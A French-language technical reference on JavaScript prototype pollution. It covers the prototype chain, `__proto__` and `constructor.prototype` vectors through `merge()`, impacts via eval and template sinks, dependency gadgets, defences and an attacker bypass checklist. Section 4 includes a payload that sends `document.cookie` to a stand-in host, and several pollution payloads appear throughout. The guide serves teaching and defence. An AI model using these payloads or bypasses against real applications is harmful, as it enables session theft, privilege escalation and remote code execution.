# Prototype Pollution — Référence technique complète

> **Définition.** Attaque qui permet de **compromettre un objet auquel on n'a pas accès**,
> via un objet auquel on **a** accès, en empoisonnant un maillon partagé de la chaîne de
> prototypes. Ne fonctionne que sur les langages à héritage prototypal (JavaScript).

**Phrase-noyau.** En JS, lire une propriété absente déclenche une **remontée** de la prototype
chain jusqu'à un parent qui la possède. Polluer, c'est poser une valeur sur un maillon haut de
cette chaîne pour contaminer tout ce qui remonte jusqu'à lui. Écrire = polluer ; l'impact
survient quand l'app **relit** cette valeur.

**Sommaire**
1. Socle — héritage prototypal & prototype chain
2. Mécanisme — polluer sans accès
3. Vecteurs réels — `__proto__`, `merge()`, `constructor.prototype`
4. Impact — DoS, property injection, RCE/XSS + le concept de sink
5. Le gadget & les gadgets de dépendances
6. Confirmation d'une pollution (client / serveur)
7. Client vs Serveur
8. Défense (3 familles, avec les fuites)
9. Kill chain & récap attaquant

---

## 1. Socle — héritage prototypal & prototype chain

Un objet JS = un sac de paires clé→valeur, avec un **lien caché vers un parent** (`__proto__`),
jusqu'à l'ancêtre commun `Object`.

**Remontée de chaîne (lecture).** Le moteur cherche : (1) sur l'objet lui-même → (2) parent →
(3) grand-parent → … → `Object.prototype`. Absent partout → `undefined` (erreur si appelé
comme fonction).

```javascript
const Technician = function(name, birthdate, paymentId) {
  this.name = name; this.birthdate = birthdate; this.paymentId = paymentId;
}
const Bob = new Technician("Bob", "12/01/1970", 12345);
console.log(Bob.toString()); // "[object Object]"
```

| Étape | Cherche `toString()` chez | Trouvé ? |
|-------|---------------------------|----------|
| 1 | `Bob` | Non |
| 2 | `Technician` | Non |
| 3 | `Object` | **Oui** |

Hiérarchie : `Object → Technician → Bob`

```javascript
Bob.__proto__ == Technician.prototype;         // true (parent direct)
Bob.__proto__.__proto__ == Object.prototype;   // true (grand-parent)
Bob instanceof Object;                          // true
```

**`__proto__` vs `prototype` (piège de vocabulaire)**

| | Rôle | Vit sur |
|---|---|---|
| `prototype` | le **moule** (blueprint) | les fonctions constructeur (`Technician.prototype`) |
| `__proto__` | le **fil réel** d'un objet vivant vers son parent | tout objet créé (`Bob.__proto__`) |

---

## 2. Mécanisme — polluer un objet qu'on ne contrôle pas

La remontée sert à lire ; on la retourne pour **écrire** sur un maillon partagé → tout ce qui
en hérite trouvera notre valeur.

```javascript
const addTechnicianFunctionality = function(obj) {
  Technician.prototype[obj.name] = obj.data;   // écrit sur un maillon partagé
}
// payload attaquant :
{ name: "toString", data: `function() { console.log("polluted!"); }` }

Bob.toString(); // "polluted!"
```

Bob remonte, tombe sur le `toString` empoisonné **avant** le vrai (celui d'`Object`), l'exécute.
**Bob compromis sans être touché.**

**Image :** on a *miné le chemin* menant à la vraie valeur ; l'objet marche dessus en remontant.

**Blast radius — choix de la cible**

| Maillon empoisonné | Portée |
|--------------------|--------|
| `Technician.prototype` | seulement les techniciens |
| **`Object.prototype`** | **tous les objets** (ancêtre commun) = **la citerne** |

`Object.prototype` est toujours la cible finale : rayon d'explosion maximal.

---

## 3. Vecteurs réels — atteindre le prototype depuis un simple JSON

En vrai, l'attaquant n'a **que de la donnée** à envoyer. La clé magique : **`__proto__`**, une
porte du langage qui fait passer une écriture du niveau objet → niveau prototype partagé.

**Vecteur classique : `merge()`** (lib npm `merge v2.0`, vulnérable)

```javascript
// ÉCHOUE : écrit sur Object (l'objet) → mauvais étage
merge(Object, { isAdmin: true });
Bob.isAdmin; // undefined

// MARCHE : __proto__ écrit sur Object.prototype (la citerne)
merge(Object, { "__proto__.isAdmin": true });
Bob.isAdmin; // true
```

`Object.isAdmin` est **hors chemin** : Bob lit `Object.prototype`, pas `Object`.

**Variante bypass : `constructor.prototype`**

```javascript
merge(Object, { "constructor.prototype.isAdmin": true });
Bob.isAdmin; // true — autre porte, même citerne
```

Utile car un filtre qui ne bloque que `"__proto__"` laisse `constructor.prototype` ouvert.

**Où chercher la source** — toute fonction qui recopie récursivement des clés d'une source non
fiable : `merge()`, `extend()`, `deepClone()`, `deepAssign()`, `Object.assign` récursif, `set()`
sur chemins imbriqués, loaders de config, parsers de query string (`qs`, `dotty`…).

---

## 4. Impact — que fait-on d'une citerne empoisonnée ?

> Polluer = **écrire**. L'impact = quand l'app **lit** ce qu'on a écrit. Sans code qui lit notre
> propriété, aucun impact. La pollution est une **primitive** qu'on **escalade**.

Même écriture, gravité croissante selon ce que le code **fait** de la valeur.

**Archétype 1 — DoS (le code fait un *calcul*)**

```javascript
function afficherPrix(produit) {
  if (produit.remise) { return produit.prix - produit.remise; } // dev suppose undefined
  return produit.prix;
}
merge(cible, { "__proto__.remise": "beaucoup" });
// tout produit remonte → remise = "beaucoup" → 50 - "beaucoup" = NaN → casse
```

On fait **exister** une propriété censée rester `undefined` → branches conditionnelles détournées.

**Archétype 2 — Property injection (le code prend une *décision*)**

```javascript
function chargerTableauDeBord(user) {
  if (user.isAdmin) { afficherPanneauAdmin(); } else { afficherPanneauNormal(); }
}
merge(cible, { "__proto__.isAdmin": true });
// user sans isAdmin → remonte → true → panneau admin
```

On n'a pas cassé l'auth : on a fait répondre "oui" à "est-il admin ?" pour tout le monde.

**Archétype 3 — Exécution de code (le code *exécute* via un SINK)**

Un **sink** = une ligne qui exécute une chaîne comme du code (`eval`) ou la transforme en HTML
vivant (`innerHTML`, `DOMParser.parseFromString`).

```javascript
function lancerModule(config) {
  const code = config.moduleInit || "console.log('défaut')";
  eval(code); // ← LE SINK
}
merge(cible, { "__proto__.moduleInit": "fetch('https://moi.com/vol?c='+document.cookie)" });
```

- Côté client → **XSS** · Côté serveur (Node) → **RCE**
- Sinks à chasser : `eval`, `Function()`, `setTimeout(string)`, `innerHTML`, `document.write`,
  `DOMParser.parseFromString`, côté Node `child_process`, templates dynamiques.

**Règle : pollution + sink qui lit la propriété polluée = code execution.**

---

## 5. Le GADGET & les gadgets de dépendances

**Un gadget** = la chaîne complète qui transforme une pollution en **impact concret**
(pas forcément RCE : DoS, élévation de privilèges, XSS ou RCE selon le sink). Trois pièces,
toutes indispensables :

```
[1] SOURCE          → le point d'entrée polluable (merge & co.), par où on injecte __proto__
[2] PROPRIÉTÉ       → le nom exact que l'app relira (isAdmin, moduleInit…), le pont
[3] SINK / lecture  → la ligne qui lit cette propriété et fait le dégât, où ça pète
```

Enlève une pièce → pas d'exploitation. Une pollution qui "marche" ne coche que la pièce 1 :
**preuve de capacité, pas d'impact.**

### Gadgets de dépendances (le game-changer)

`Object.prototype` est la citerne de **tout le processus** — ton code **et** tout `node_modules`.
Le moteur JS ne distingue pas "objet de ton app" et "objet d'Express" : les deux remontent la
**même** citerne. Donc polluer `Object.prototype` empoisonne aussi les objets internes des
dépendances, qui lisent quantité de propriétés à défaut `undefined`. Chaque lecture = **pièces 2
et 3 offertes**.

**Pourquoi c'est décisif :** le code des dépendances populaires est **public**. La communauté a
déjà lu le source, identifié les chemins propriété→sink, et publié des **gadgets universels** —
qui marchent sur *toute* app utilisant cette lib, sans connaître son code applicatif.

**Exemples**

- **Express — `json spaces`** : `{ "__proto__": { "json spaces": 10 } }` → toutes les réponses
  JSON reviennent indentées. Impact léger, mais confirme la pollution **sans code source**.
- **Moteurs de template (`lodash.template`, `ejs`, `pug`)** : construisent du JS à la volée et
  l'exécutent (souvent via `Function()`). Polluer une option interne (délimiteur, en-tête…) qu'ils
  lisent à défaut `undefined` → ton code est compilé dans le template généré → **RCE**.

```
[toi] pollue __proto__.<option interne de la lib> avec du code
      ↓
[la lib] lit l'option (jamais définie → remonte → ta valeur)
      ↓
[la lib] compile ta valeur puis l'exécute via Function()   ← le SINK est DANS la lib
      ↓
RCE
```

**Implication défensive majeure :** un dev qui `grep eval` **uniquement dans son code** conclut
« pas de sink, safe » — et a tort. Le sink vit dans `node_modules`. Une app au code irréprochable
peut être RCE **uniquement par ce qu'elle importe**.

**Difficulté d'exploitation, du plus dur au plus facile :**
1. boîte noire + code applicatif privé → deviner les noms de propriété (très dur)
2. boîte blanche → le source donne nom + sink (facile mais spécifique)
3. **dépendance publique → gadget universel catalogué** (facile *et* réutilisable partout)

---

## 6. Confirmer une pollution — les signes

But : prouver que ta valeur écrite via `__proto__` ressort ailleurs sans avoir touché cet
"ailleurs". Ça confirme **seulement la pièce 1** (la source marche).

**Côté client (console DevTools dispo)**

```javascript
merge(cible, { "__proto__.polluted": "test123" });
({}).polluted;              // "test123" → citerne empoisonnée (preuve directe)
Object.prototype.polluted;  // "test123" (équivalent)
```

Piège : `JSON.stringify` **ignore les propriétés héritées** → un objet pollué n'y montre pas
`polluted`. Visible via `for...in` et l'accès par nom. La sonde `({}).polluted` reste la plus fiable.

**Côté serveur (aveugle — que les réponses HTTP)**

1. **Réflexion** : la propriété polluée réapparaît dans le JSON/HTML de réponse.
2. **Propriété interne du framework** (technique reine en boîte noire) :
   `{ "__proto__": { "json spaces": 10 } }` → indentation modifiée = preuve sans code source.
   On s'appuie sur des propriétés **lues par le framework** (nom + lecteur offerts par le source
   public) quand le code applicatif est caché.
3. **Erreur / DoS** : type incompatible → `500`, message d'erreur, temps de réponse anormal.

---

## 7. Client vs Serveur

Même attaque (`__proto__` → citerne → relecture). Seul **l'endroit où tourne le JS** change.

| | **Côté client** | **Côté serveur (Node)** |
|---|---|---|
| Où tourne le JS | navigateur de la victime | serveur |
| Vecteur d'injection | **URL piégée** (`?__proto__[x]=…`, fragment) | **corps HTTP** (JSON) |
| Ce qui est pollué | l'onglet d'**une** victime | le processus, **tous** les users |
| Durée de vie | session de l'onglet (reset au refresh) | **jusqu'au redémarrage serveur** |
| Confirmation | console : `({}).polluted` | déduit des réponses HTTP |
| Pire impact | **XSS** | **RCE** |

```
client :  https://site.com/page?__proto__[polluted]=test123
serveur : POST body  { "__proto__": { "polluted": "test123" } }
```

**Serveur plus grave :** un processus **partagé** + **persistant** → un seul payload contamine
**toute la base d'utilisateurs, durablement**.

**Pourquoi URL vs corps HTTP :** on injecte par le canal que le code vulnérable **lit
habituellement**. Client lit `location.search`/`.hash` → URL. Serveur lit `req.body` → corps.

---

## 8. Défense — 3 familles (avec les fuites)

Fil rouge : **on peut filtrer l'entrée, blinder la cible, ou supprimer la cible.** Plus on
descend, plus c'est robuste (cause vs symptôme), plus ça demande de discipline.

### 8.1 Key sanitization (agit sur l'ENTRÉE)

Inspecter les clés avant tout merge.

- **Blocklist (fragile)** : interdit les clés "connues dangereuses". Fuite → **par omission** :
  bloque `__proto__` mais oublie `constructor.prototype`, l'encodage, la casse, les clés
  imbriquées. *Une blocklist ne protège que contre ce à quoi on a pensé.*
- **Allowlist (robuste, fail-safe)** : n'autorise que les clés légitimes, rejette tout le reste.
  Bloque même les attaques **non anticipées** (échec du côté sûr).

```javascript
const allowedKeys = ["street", "city", "state", "firstName", "lastName"];
const isKeyValid = (key) => allowedKeys.includes(key);
// __proto__ / constructor absents de la liste → rejetés d'office
```

**Fuite globale :** l'allowlist est **inapplicable** si l'app doit accepter des clés dynamiques.
→ Angle attaquant : cibler les **endpoints à clés libres**.

### 8.2 `Object.freeze()` (agit sur la CIBLE)

Rend le prototype **immuable** : plus d'ajout/modif/suppression.

```javascript
Object.freeze(Object.prototype);
merge(cible, { "__proto__.isAdmin": true });
({}).isAdmin; // undefined — l'écriture sur le prototype gelé est ignorée (throw en strict)
```

Le payload **atteint** la citerne mais ne peut pas la modifier : elle est scellée. La lecture par
remontée continue de marcher ; seule l'**écriture** est bloquée. Le gel dure la session (à
réappliquer à chaque exécution).

**Fuites (deux raisons de ne pas tout geler) :**
- **Coût fonctionnel** : un objet gelé ne peut plus muter, même légitimement.
- **Bulk freeze casse** : des APIs DOM/JS dépendent de la mutabilité → geler en masse fait tomber
  des pans entiers.
→ Donc gel **partiel** → prototypes oubliés (`Array.prototype`, `Function.prototype`, prototypes
de libs). Angle attaquant : passer par un prototype **non gelé**, ou par `constructor.prototype`.

### 8.3 Défenses structurelles (agissent sur la CAUSE RACINE)

Supprimer la citerne ou utiliser des structures sans citerne.

**`Object.create(null)` — objet sans ancêtre.** Sur un tel objet, `__proto__` **perd son pouvoir**
(plus de fil vers un prototype) : ce n'est plus une porte, juste une clé de données ordinaire.

```javascript
const safe = Object.create(null);
safe.__proto__ = { isAdmin: true }; // stocke littéralement la clé, aucun effet
safe.isAdmin;                       // undefined
```

**`Map` au lieu de `{}`.** Vraie structure dictionnaire, ne mélange pas données et chaîne de
prototypes. `"__proto__"` y est une clé normale.

```javascript
const m = new Map();
m.set("__proto__", "test"); m.get("__proto__"); // "test" — citerne intacte
```

**`--disable-proto` (Node).** Neutralise `__proto__` pour tout le processus.

```bash
node --disable-proto=throw app.js
```

**Fuites :** discipline à appliquer **partout** — un seul `{}` mutable recevant de l'input non
fiable rouvre la surface. `--disable-proto` ne neutralise pas forcément `constructor.prototype`.
Angle attaquant : trouver l'objet/lib non durci, la porte oubliée.

### Panorama

| Mitigation | Agit sur… | Principe | Fuite principale |
|---|---|---|---|
| Key sanitization | l'entrée | filtrer les clés (allowlist > blocklist) | inapplicable si clés libres ; blocklist incomplète |
| `Object.freeze` | la cible | sceller le prototype | coûteux/cassant → gel partiel → prototypes oubliés |
| Structurel | la cause racine | supprimer/éviter la citerne | discipline partout ; une brèche suffit |

**Loi générale :** une mitigation ne protège que le périmètre **exact** où elle est appliquée.
L'attaquant gagne toujours **là où la défense n'a pas été posée.**

---

## 9. Kill chain & récap attaquant

```
[1] JS remonte la prototype chain pour lire une propriété absente
      ↓
[2] on écrit sur un maillon partagé → contamine tout ce qui en hérite
      ↓
[3] on atteint Object.prototype depuis un JSON via __proto__ / constructor.prototype
      recopié par un merge()
      ↓
[4] l'app (ou une dépendance) relit une propriété jamais définie → ramasse notre valeur
      ↓  si cette lecture alimente un sink (eval, innerHTML, Function d'une lib…) :
    → XSS (client) / RCE (serveur)    sinon → DoS ou élévation de privilèges
```

**Méthodo boîte blanche :** grep les sinks + lectures sensibles (`eval`, `innerHTML`, `config.`,
`options.`, `child_process`) → note le nom de propriété → remonte vers un point d'injection
(`merge`/deep-copy) → aligne source → propriété → sink.

**Méthodo boîte noire :** confirmer la source (`({}).polluted` / `json spaces`) → identifier la
**stack** (headers, erreurs, comportement) → appliquer des **gadgets universels** connus pour
cette dépendance.

**Checklist bypass rapide :**
- filtre `__proto__` ? → tester `constructor.prototype`
- `Object.freeze(Object.prototype)` ? → autres prototypes / `constructor.prototype` / fenêtre
  avant gel
- allowlist ? → chercher un endpoint à clés libres
- code applicatif propre ? → chercher un gadget dans les dépendances
